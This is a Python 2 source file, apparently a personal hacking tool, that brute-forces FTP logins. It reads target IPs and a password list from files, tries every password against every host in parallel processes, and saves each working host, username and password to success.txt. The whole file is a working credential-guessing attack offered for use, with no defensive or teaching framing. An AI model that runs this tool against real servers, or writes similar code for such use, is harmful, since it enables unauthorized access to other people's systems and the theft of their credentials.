# -*- coding:utf-8 -*-
# __author__:langzi
# __blog__:www.langzi.fun
from ftplib import FTP
import multiprocessing
import ConfigParser

login_timeout = 10


def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")


def brute_ftp(ip,username,passwords,port):
    for password in passwords:
        print 'Checking>>>FTP:' + ip + '@' + username + ':' + password + ':'  + str(port)
        try:
            ftp = FTP(ip)
            ftp.connect(ip, port)
            ftp.login(username, password)
            if 'Not implemented' in ftp.dir():
                pass
            else:
                success('FTP:'+ip + ':' + str(port) + '|' + username + ':' + password)
            ftp.quit()
        except Exception, e:
            #print e
            pass

if __name__ == '__main__':
    multiprocessing.freeze_support()

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    print '\n\n     多进程版本'
    print '         爆破用户名:' + user
    print '         爆破端口号:' + str(port)
    print '         爆破进程数:' + str(thread_s)

    New_start = raw_input('导入IP:')  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start, 'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt', 'r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(brute_ftp, args=(ip, user, Password_list_, port))
    p.close()
    p.join()
